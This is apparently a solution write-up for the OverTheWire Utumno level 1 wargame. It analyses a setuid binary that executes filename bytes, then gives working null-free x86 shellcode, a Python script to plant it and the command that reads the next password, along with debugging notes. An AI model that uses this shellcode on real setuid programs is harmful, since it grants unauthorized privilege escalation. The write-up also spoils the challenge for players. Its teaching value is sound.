# OverTheWire — Utumno Level 1 Solution (utumno1 → utumno2)

> Goal: Get utumno2 user's password from `utumno1`.
> Technique: **Intentional shellcode execution** in a setuid binary (RWX buffer + return address overwrite).

---

## 1. Connection

```bash
ssh utumno1@utumno.labs.overthewire.org -p 2227
# password: ........   (from the previous level)
```

---

## 2. Recon

```bash
ls -la /utumno/utumno1
# -r-sr-x--- 1 utumno2 utumno1 13608 utumno1   <-- SUID utumno2, group utumno1 = READABLE
file /utumno/utumno1
# setuid ELF 32-bit LSB, dynamically linked, with debug_info, not stripped
```

**Important:** This binary is `r-x` for us (group utumno1) → we **can read it**, so static
analysis (objdump/strings/gdb) is possible. When run, it executes as utumno2 (suid).

### strings — hints
```bash
strings /utumno/utumno1 | grep -viE "GLIBC|GCC|__"
```
Notable: `opendir`, `readdir`, `mmap`, `strncpy`, `strncmp`, `argv`, `argc`
→ It reads a **directory** and does something with the filenames inside.

Running without arguments → `exit=1` (argv[1] required).

---

## 3. Static Analysis — `main`

```bash
objdump -d -M intel /utumno/utumno1 | sed -n '/<main>:/,/^$/p'
```

Pseudocode (decompiled):
```c
int main(int argc, char **argv) {
    if (argv[1] == NULL) exit(1);
    buf = mmap(NULL, 0x1000, PROT_READ|WRITE|EXEC, MAP_PRIVATE|ANON, -1, 0); // RWX!
    global_buf = buf;                       // ds:0x804b22c
    if (buf == NULL) exit(2);
    DIR *d = opendir(argv[1]);              // argv[1] = a DIRECTORY
    if (d == NULL) exit(1);
    while ((entry = readdir(d)) != NULL) {
        // d_name = entry + 0xb  (dirent: d_ino+d_off+d_reclen+d_type = 11 byte offset)
        if (strncmp("sh_", entry->d_name, 3) == 0)   // .rodata @0x804a008 = "sh_"
            run(entry->d_name + 3);                  // send AFTER "sh_" to run
    }
    return 0;
}
```

`.rodata` verification:
```bash
objdump -s -j .rodata /utumno/utumno1
# 804a000  03000000 01000200 73685f00   ........sh_.
#                              ^^^^^^ "sh_\0"  (@0x804a008)
```

---

## 4. Static Analysis — `run()` (THE ACTUAL VULNERABILITY)

```bash
objdump -d -M intel /utumno/utumno1 | sed -n '/<run>:/,/^$/p'
```

Pseudocode:
```c
void run(char *arg) {
    strncpy(global_buf, arg, 0x1000);   // copy arg into RWX buffer
    *(ebp + 4) = global_buf;            // <<< WRITES OWN RETURN ADDRESS to the buffer!
    // stack canary check (intact, no overflow)
    return;   // ret -> EIP = global_buf -> executes arg as MACHINE CODE
}
```

> So: the part of a filename after `sh_` is copied into RWX memory and
> **executed as shellcode** — and since the binary is suid, it runs as **utumno2**.

**Plan:** Give a directory containing a file named `sh_<shellcode>` as argv[1].

---

## 5. Constraints and Shellcode

A filename cannot contain two bytes:
- `/` (0x2f) — path separator
- `\0` (0x00) — string terminator (also stops strncpy)

So we need **null-free + slash-free** 32-bit shellcode. Instead of writing `"/bin/sh"` literally,
I built it at runtime via **`XOR 0x01010101`**. Also added `setreuid(euid, euid)` to carry
the suid privilege into the shell.

```
; setreuid(geteuid(), geteuid())
xor eax,eax ; mov al,201 ; int 0x80     ; geteuid32 -> eax = euid (utumno2)
mov ebx,eax ; mov ecx,eax
xor eax,eax ; mov al,203 ; int 0x80     ; setreuid32(euid,euid)

; execve("/bin/sh", ["/bin/sh", NULL], NULL)   -- slash-free
xor eax,eax ; push eax                  ; string NUL terminator
mov eax,0x0169722e ; xor eax,0x01010101 ; push eax   ; -> 0x0068732f = "/sh\0"
mov eax,0x6f68632e ; xor eax,0x01010101 ; push eax   ; -> 0x6e69622f = "/bin"
mov ebx,esp                             ; ebx -> "/bin/sh"
xor eax,eax ; push eax ; push ebx ; mov ecx,esp   ; ecx -> ["/bin/sh", NULL]
xor edx,edx                             ; envp = NULL
xor eax,eax ; mov al,11 ; int 0x80      ; execve
```

XOR logic (example `"/sh\0"`): target bytes `2f 73 68 00` = LE dword `0x0068732f`.
`0x0068732f ^ 0x01010101 = 0x0169722e` (bytes: `2e 72 69 01` — no `/` no `\0`). ✓

### Exploit script (create file with Python)
```python
import os
sc = bytes([
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80,
 0x31,0xc0,0x50,0xb8,0x2e,0x72,0x69,0x01,0x35,0x01,0x01,0x01,0x01,0x50,
 0xb8,0x2e,0x63,0x68,0x6f,0x35,0x01,0x01,0x01,0x01,0x50,0x89,0xe3,
 0x31,0xc0,0x50,0x53,0x89,0xe1,0x31,0xd2,0x31,0xc0,0xb0,0x0b,0xcd,0x80])
assert 0 not in sc and 0x2f not in sc          # badchar check
name = b"sh_" + sc
fd = os.open(b"dir/"+name, os.O_CREAT|os.O_WRONLY, 0o644); os.close(fd)
```

### Execution
```bash
W=$(mktemp -d); chmod 755 "$W"; cd "$W"; mkdir dir; chmod 755 dir
python3 create.py                # creates the file inside dir/
echo "id; cat /etc/utumno_pass/utumno2" | /utumno/utumno1 "$PWD/dir"
```

Output:
```
uid=16002(utumno2) gid=16001(utumno1) groups=16001(utumno1)
```

---

## 6. Debugging Journey — 3 Bugs Encountered

The shell didn't open on the first attempts. Three problems solved in order:

### Bug 1 — Broken execve syscall number → SIGSEGV `0xffffffda`
Seen via `strace`: `--- SIGSEGV si_addr=0xffffffda ---` (0xffffffda = -38 = ENOSYS).
Cause: `mov al,0x0b` only sets the **low byte** of `eax`; upper bytes still held the
`"/bin"` value (`0x6e6962..`) → syscall number = `0x6e69620b` (invalid) → ENOSYS
→ subsequent null bytes (`add [eax],al`, eax=0xffffffda) → segfault.
**Fix:** Add `xor eax,eax` before `execve` to fully clear `eax`.
(geteuid/setreuid already had `xor eax,eax`, only execve was missing it.)

### Bug 2 — dash not starting with `argv = NULL`
Initial shellcode called `execve("/bin/sh", NULL, NULL)`; dash didn't work properly with
a NULL `argv[0]`. **Fix:** Build `["/bin/sh", NULL]` array on the stack and point `ecx` to it.

### Bug 3 — `opendir` permission error (most subtle)
In real suid execution, `rc=1` (not segfault!). `exit(1)` in `main` = `opendir(argv[1]) == NULL`.
Cause: `mktemp -d` created directory with **700 / utumno1** ownership; in suid execution
euid=**utumno2** couldn't **enter** that directory (no search/x permission) → `opendir` failed.
> Why this was hidden: `strace` **drops suid** (kernel security), process runs as utumno1 and
> can enter its own 700 directory → "works under strace but not in reality" confusion.
> `rc=1` (≠139 segfault) gave it away.

**Fix:** `chmod 755 "$W"` so utumno2 can traverse it.

| Symptom | Real cause | Fix |
|---------|------------|-----|
| SIGSEGV @0xffffffda | execve syscall number corrupted (al only) | `xor eax,eax` before execve |
| Shell exits silently | `argv=NULL` | argv = `["/bin/sh",NULL]` |
| `rc=1`, run() never called | suid euid can't enter 700 directory | `chmod 755` working dir |

---


## Summary / Lessons Learned

| Topic | Note |
|-------|------|
| **Intentional shellcode exec** | Binary copies filename into RWX memory and overwrites its own ret addr to execute it |
| **Badchar avoidance** | Filename can't contain `/` and `\0` → build strings at runtime via XOR |
| **suid privilege preservation** | `setreuid(euid,euid)` before `execve` to carry privilege into shell |
| **strace vs reality** | strace drops setuid; can hide permission/privilege bugs specific to suid → check `rc` value |
| **`mov al, x` trap** | 8-bit write doesn't clear upper bytes; syscall number needs full `eax` |
| **Directory traversal permission** | Path given to suid binary must be accessible to the binary's euid |
